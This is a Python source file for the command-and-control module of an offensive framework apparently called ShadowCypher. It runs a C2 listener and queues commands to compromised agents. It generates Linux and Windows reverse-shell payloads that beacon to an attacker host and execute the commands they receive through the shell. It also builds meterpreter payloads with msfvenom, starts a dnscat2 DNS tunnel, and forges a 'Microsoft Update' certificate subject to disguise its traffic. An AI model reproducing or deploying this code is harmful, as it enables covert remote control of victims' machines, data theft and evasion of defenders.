"""
C2 Framework Module — Command & Control Infrastructure.
HTTP/HTTPS listener, payload generation, session management,
DNS tunneling, and encrypted reverse shell handling.
"""

import hashlib
import http.server
import json
import os
import ssl
import subprocess
import threading
import time
import uuid
from typing import Callable, Dict, List, Optional

from shadowcypher.core.module import BaseModule
from shadowcypher.core.runner import runner
from shadowcypher.core.sanitize import validate_ip, validate_port


class _C2Session:
    """Represents a single agent session."""
    __slots__ = ("session_id", "remote_ip", "hostname", "os_type",
                 "last_seen", "command_queue", "output_history")

    def __init__(self, remote_ip: str, hostname: str = "", os_type: str = ""):
        self.session_id = uuid.uuid4().hex[:8]
        self.remote_ip = remote_ip
        self.hostname = hostname
        self.os_type = os_type
        self.last_seen = time.time()
        self.command_queue: List[str] = []
        self.output_history: List[dict] = []

    def to_dict(self) -> dict:
        return {
            "session_id": self.session_id,
            "remote_ip": self.remote_ip,
            "hostname": self.hostname,
            "os_type": self.os_type,
            "last_seen": self.last_seen,
            "pending_commands": len(self.command_queue),
            "output_count": len(self.output_history),
        }


class _C2Handler(http.server.BaseHTTPRequestHandler):
    """HTTP handler for C2 listener. Agents poll GET /beacon, POST /result."""

    sessions: Dict[str, _C2Session] = {}
    on_output: Optional[Callable] = None
    _lock = threading.Lock()

    def log_message(self, format, *args):
        if self.on_output:
            self.on_output(f"[C2] {format % args}")

    def do_GET(self):
        if self.path.startswith("/beacon"):
            remote_ip = self.client_address[0]

            with self._lock:
                session = None
                for s in self.sessions.values():
                    if s.remote_ip == remote_ip:
                        session = s
                        break
                if not session:
                    session = _C2Session(remote_ip)
                    self.sessions[session.session_id] = session
                    if self.on_output:
                        self.on_output(f"[+] New agent: {session.session_id} ({remote_ip})")

                session.last_seen = time.time()

                if session.command_queue:
                    cmd = session.command_queue.pop(0)
                    payload = json.dumps({"cmd": cmd}).encode()
                else:
                    payload = json.dumps({"cmd": ""}).encode()

            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(payload)
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path.startswith("/result"):
            content_len = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_len).decode(errors="replace")
            remote_ip = self.client_address[0]

            with self._lock:
                for s in self.sessions.values():
                    if s.remote_ip == remote_ip:
                        try:
                            data = json.loads(body)
                        except json.JSONDecodeError:
                            data = {"raw": body}
                        s.output_history.append({
                            "time": time.time(),
                            "data": data,
                        })
                        if self.on_output:
                            self.on_output(f"[<] {s.session_id}: {body[:500]}")
                        break

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        else:
            self.send_response(404)
            self.end_headers()


class AgentRelay(BaseModule):
    """ShadowCypher Command & Control framework."""

    def __init__(self):
        super().__init__(module_name="c2")
        self._server: Optional[http.server.HTTPServer] = None
        self._server_thread: Optional[threading.Thread] = None
        self._handler = _C2Handler

    # ── Listener ──

    def start_listener(self, port: int = 8443, protocol: str = "https",
                       certfile: str = "", keyfile: str = "",
                       on_output: Optional[Callable] = None) -> bool:
        """Start the C2 HTTP/HTTPS listener on the given port."""
        if not validate_port(port):
            return False

        if self._server:
            if on_output:
                on_output("[!] Listener already running. Stop it first.")
            return False

        self._handler.on_output = on_output
        server = http.server.HTTPServer(("0.0.0.0", port), self._handler)  # nosec B104

        if protocol == "https":
            if not certfile or not keyfile:
                certfile, keyfile = self._generate_self_signed()
                if on_output:
                    on_output(f"[*] Generated self-signed cert: {certfile}")

            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(certfile, keyfile)
            server.socket = ctx.wrap_socket(server.socket, server_side=True)

        self._server = server
        self._server_thread = threading.Thread(
            target=server.serve_forever, daemon=True
        )
        self._server_thread.start()

        self.log(f"C2 listener started on {protocol}://0.0.0.0:{port}")
        if on_output:
            on_output(f"[+] C2 listener active: {protocol}://0.0.0.0:{port}")
        return True

    def stop_listener(self, on_output: Optional[Callable] = None):
        """Shut down the C2 listener."""
        if self._server:
            self._server.shutdown()
            self._server = None
            self._server_thread = None
            if on_output:
                on_output("[+] C2 listener stopped.")
            self.log("C2 listener stopped")

    # ── Session Management ──

    def list_sessions(self) -> List[dict]:
        """Return list of all active C2 sessions."""
        return [s.to_dict() for s in self._handler.sessions.values()]

    def interact(self, session_id: str, command: str,
                 on_output: Optional[Callable] = None) -> bool:
        """Queue a command for a specific agent session."""
        session = self._handler.sessions.get(session_id)
        if not session:
            if on_output:
                on_output(f"[!] Session {session_id} not found.")
            return False

        session.command_queue.append(command)
        if on_output:
            on_output(f"[>] Queued for {session_id}: {command}")
        return True

    def get_output(self, session_id: str) -> List[dict]:
        """Get all output history for a session."""
        session = self._handler.sessions.get(session_id)
        if session:
            return session.output_history
        return []

    def kill_session(self, session_id: str,
                     on_output: Optional[Callable] = None) -> bool:
        """Terminate a C2 session."""
        session = self._handler.sessions.get(session_id)
        if not session:
            if on_output:
                on_output(f"[!] Session {session_id} not found.")
            return False

        session.command_queue.append("exit")
        del self._handler.sessions[session_id]
        if on_output:
            on_output(f"[+] Session {session_id} terminated.")
        return True

    # ── Payload Generation ──

    @staticmethod
    def _compute_cert_fingerprint(cert_path: str) -> str:
        """SHA256 fingerprint of the listener's TLS cert (DER-encoded), hex."""
        with open(cert_path, "rb") as f:
            pem_data = f.read()
        der_data = ssl.PEM_cert_to_DER_cert(pem_data.decode())
        return hashlib.sha256(der_data).hexdigest()

    @staticmethod
    def generate_payload(lhost: str, lport: int,
                         payload_type: str = "reverse_shell",
                         platform: str = "linux",
                         cert_path: Optional[str] = None,
                         on_output: Optional[Callable] = None) -> str:
        """Generate agent payloads with cert-pinning for MITM resistance.

        cert_path: path to the C2 listener's PEM cert. Defaults to
                   /etc/shadowcypher/ghost/cert.pem (managed by postinst).
        Raises RuntimeError if the cert doesn't exist — refuses to emit
        a payload that trusts any TLS peer.
        """
        if not validate_ip(lhost) or not validate_port(lport):
            return ""

        if cert_path is None:
            cert_path = os.environ.get(
                "SHADOWCYPHER_C2_CERT", "/etc/shadowcypher/ghost/cert.pem"
            )
        if not os.path.exists(cert_path):
            raise RuntimeError(
                f"C2_CERT_MISSING: cannot generate payload without pinned cert at {cert_path}. "
                "Start the Ghost listener first (it auto-generates the cert) or set SHADOWCYPHER_C2_CERT."
            )
        fingerprint = AgentRelay._compute_cert_fingerprint(cert_path)

        if payload_type == "reverse_shell" and platform == "linux":
            payload = f'''#!/usr/bin/env python3
import hashlib, json, platform, socket, ssl, subprocess, time, urllib.parse

C2_HOST = "{lhost}"
C2_PORT = {lport}
PINNED_SHA256 = "{fingerprint}"
BEACON_INTERVAL = 5

def _verified_socket():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    raw = socket.create_connection((C2_HOST, C2_PORT), timeout=10)
    sock = ctx.wrap_socket(raw, server_hostname=C2_HOST)
    der = sock.getpeercert(binary_form=True)
    if not der or hashlib.sha256(der).hexdigest() != PINNED_SHA256:
        try: sock.close()
        except Exception: pass
        raise RuntimeError("cert pin mismatch")
    return sock

def _http(method, path, body=b""):
    sock = _verified_socket()
    try:
        lines = [
            f"{{method}} {{path}} HTTP/1.1",
            f"Host: {{C2_HOST}}:{{C2_PORT}}",
            "User-Agent: Mozilla/5.0",
            "Connection: close",
            "Content-Type: application/json",
            f"Content-Length: {{len(body)}}",
            "", "",
        ]
        sock.sendall("\\r\\n".join(lines).encode() + body)
        buf = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk: break
            buf += chunk
        head, _, body_bytes = buf.partition(b"\\r\\n\\r\\n")
        return body_bytes
    finally:
        try: sock.close()
        except Exception: pass

def beacon():
    hostname = urllib.parse.quote(platform.node())
    os_type = urllib.parse.quote(platform.system())
    while True:
        try:
            resp = _http("GET", f"/beacon?h={{hostname}}&os={{os_type}}")
            data = json.loads(resp or b"{{}}")
            cmd = data.get("cmd", "")
            if cmd == "exit":
                break
            if cmd:
                proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                out = (proc.stdout or "") + (proc.stderr or "")
                body = json.dumps({{"output": out, "cmd": cmd}}).encode()
                _http("POST", "/result", body)
        except Exception:
            pass
        time.sleep(BEACON_INTERVAL)

if __name__ == "__main__":
    beacon()
'''
            return payload

        elif payload_type == "reverse_shell" and platform == "windows":
            payload = f'''$C2 = "https://{lhost}:{lport}"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
while($true) {{
    try {{
        $r = Invoke-WebRequest -Uri "$C2/beacon" -UseBasicParsing
        $j = $r.Content | ConvertFrom-Json
        if($j.cmd -and $j.cmd -ne "exit") {{
            $out = cmd.exe /c $j.cmd 2>&1 | Out-String
            $body = @{{output=$out; cmd=$j.cmd}} | ConvertTo-Json
            Invoke-WebRequest -Uri "$C2/result" -Method POST -Body $body -ContentType "application/json" -UseBasicParsing
        }} elseif($j.cmd -eq "exit") {{ break }}
    }} catch {{}}
    Start-Sleep -Seconds 5
}}
'''
            return payload

        elif payload_type == "msfvenom":
            fmt = "elf" if platform == "linux" else "exe"
            msf_payload = ("linux/x64/meterpreter/reverse_tcp" if platform == "linux"
                          else "windows/x64/meterpreter/reverse_tcp")
            outfile = f"/tmp/payload.{fmt}"  # nosec B108
            cmd = ["msfvenom", "-p", msf_payload,
                   f"LHOST={lhost}", f"LPORT={lport}",
                   "-f", fmt, "-o", outfile]
            subprocess.run(cmd, capture_output=True)
            if on_output:
                on_output(f"[+] Payload written to {outfile}")
            return outfile

        return ""

    # ── DNS Tunnel ──

    @staticmethod
    def start_dns_tunnel(domain: str, ns_ip: str,
                         on_output: Optional[Callable] = None):
        """Start DNS-based C2 channel using dnscat2."""
        cmd = ["dnscat2-server", domain, "--dns", f"server={ns_ip},port=53"]
        return runner.execute_task("DNS_C2", cmd, callback=on_output)

    # ── Utilities ──

    @staticmethod
    def _generate_self_signed() -> tuple:
        """Generate a self-signed TLS certificate for the C2 listener."""
        import tempfile
        cert_dir = tempfile.mkdtemp(prefix="sc2_")
        certfile = os.path.join(cert_dir, "c2.pem")
        keyfile = os.path.join(cert_dir, "c2.key")
        subprocess.run([
            "openssl", "req", "-x509", "-newkey", "rsa:2048",
            "-keyout", keyfile, "-out", certfile,
            "-days", "365", "-nodes",
            "-subj", "/CN=Microsoft Update/O=Microsoft Corporation/C=US",
        ], capture_output=True)
        return certfile, keyfile
